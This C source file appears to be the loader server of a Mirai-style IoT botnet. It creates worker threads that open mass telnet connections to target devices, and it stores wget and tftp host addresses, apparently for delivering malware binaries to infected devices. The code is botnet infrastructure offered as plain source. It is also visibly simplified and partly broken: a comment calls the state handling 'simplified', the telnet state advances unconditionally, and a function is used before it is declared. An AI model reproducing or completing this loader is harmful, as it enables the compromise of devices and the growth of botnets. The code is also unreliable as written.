#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>
#include <sys/epoll.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <time.h>
#include "headers/includes.h"
#include "headers/server.h"
#include "headers/telnet_info.h"
#include "headers/connection.h"
#include "headers/binary.h"
#include "headers/util.h"

static int epollFD;

struct server *server_create(uint8_t threads, uint8_t addr_len, ipv4_t *addrs, uint32_t max_open, 
                              char *wghip, port_t wghp, char *thip)
{
    struct server *srv = calloc(1, sizeof(struct server));
    int i;

    srv->bind_addrs_len = addr_len;
    srv->bind_addrs = addrs;
    srv->max_open = max_open;
    srv->wget_host_ip = wghip;
    srv->wget_host_port = wghp;
    srv->tftp_host_ip = thip;
    srv->estab_conns = calloc(max_open * 2, sizeof(struct connection *));
    srv->workers = calloc(threads, sizeof(struct server_worker));
    srv->workers_len = threads;

    for (i = 0; i < max_open * 2; i++)
    {
        srv->estab_conns[i] = calloc(1, sizeof(struct connection));
        pthread_mutex_init(&srv->estab_conns[i]->lock, NULL);
    }

    epollFD = epoll_create1(0);
    
    for (i = 0; i < threads; i++)
    {
        srv->workers[i].srv = srv;
        srv->workers[i].thread_id = i;
        pthread_create(&srv->workers[i].thread, NULL, (void* (*)(void*))worker, &srv->workers[i]);
    }

    return srv;
}

void server_queue_telnet(struct server *srv, struct telnet_info *info)
{
    while (ATOMIC_GET(&srv->curr_open) >= srv->max_open) sleep(1);
    ATOMIC_INC(&srv->curr_open);
    server_telnet_probe(srv, info);
}

void server_telnet_probe(struct server *srv, struct telnet_info *info)
{
    int fd = util_socket_and_bind(srv);
    if (fd == -1)
    {
        ATOMIC_DEC(&srv->curr_open);
        return;
    }

    struct connection *conn = srv->estab_conns[fd];
    memcpy(&conn->info, info, sizeof(struct telnet_info));
    conn->srv = srv;
    conn->fd = fd;
    connection_open(conn);

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = info->addr;
    addr.sin_port = info->port;
    connect(fd, (struct sockaddr *)&addr, sizeof(addr));

    struct epoll_event event = {0};
    event.data.fd = fd;
    event.events = EPOLLOUT;
    epoll_ctl(epollFD, EPOLL_CTL_ADD, fd, &event);
}

static void *worker(void *arg)
{
    struct server_worker *wrker = (struct server_worker *)arg;
    struct epoll_event events[128];
    
    while (1)
    {
        int n = epoll_wait(epollFD, events, 128, 1000);
        for (int i = 0; i < n; i++)
        {
            struct connection *conn = wrker->srv->estab_conns[events[i].data.fd];
            if (events[i].events & EPOLLOUT && conn->state_telnet == TELNET_CONNECTING)
            {
                conn->state_telnet = TELNET_READ_IACS;
                struct epoll_event ev = {EPOLLIN, {.fd = conn->fd}};
                epoll_ctl(epollFD, EPOLL_CTL_MOD, conn->fd, &ev);
            }
            if (events[i].events & EPOLLIN)
            {
                int ret = recv(conn->fd, conn->rdbuf + conn->rdbuf_pos, 
                               sizeof(conn->rdbuf) - conn->rdbuf_pos, MSG_NOSIGNAL);
                if (ret > 0)
                {
                    conn->rdbuf_pos += ret;
                    // Process states (simplified)
                    if (conn->state_telnet == TELNET_READ_IACS)
                        connection_consume_iacs(conn);
                    conn->state_telnet = TELNET_USER_PROMPT;
                }
                else if (ret <= 0)
                {
                    connection_close(conn);
                }
            }
        }
    }
    return NULL;
}